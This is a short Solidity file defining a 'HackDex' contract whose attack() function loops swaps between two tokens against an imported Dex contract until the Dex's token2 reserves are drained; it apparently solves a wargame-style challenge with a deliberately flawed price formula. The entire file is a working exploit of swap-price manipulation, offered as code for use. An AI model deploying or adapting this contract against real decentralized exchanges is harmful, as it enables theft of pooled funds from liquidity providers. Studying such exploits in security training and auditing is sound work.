// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./Dex.sol";

/// @dev First send your 10 tokens to this contract, then launch attack...
contract HackDex {
    IERC20 public token1;
    IERC20 public token2;
    Dex public dex;

    constructor(address _token1, address _token2, address _dex) {
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
        dex = Dex(_dex);
    }

    function attack() external {
        while (token2.balanceOf(address(dex)) > 0) {
            // first approve the dex to swap
            uint256 balanceToSwap = token2.balanceOf(address(dex)) < token2.balanceOf(address(this)) ? token2.balanceOf(address(dex)) : token2.balanceOf(address(this));
            bool approved = token2.approve(address(dex), balanceToSwap);
            require(approved, "Approve failed");
            // ask for swap
            dex.swap(address(token2), address(token1), balanceToSwap);
            // approve for the second token
            balanceToSwap = token1.balanceOf(address(dex)) < token1.balanceOf(address(this)) ? token1.balanceOf(address(dex)) : token1.balanceOf(address(this));
            approved = token1.approve(address(dex), balanceToSwap);
            require(approved, "Approve failed");
            // ask for swap back
            dex.swap(address(token1), address(token2), balanceToSwap);
        }
    }
}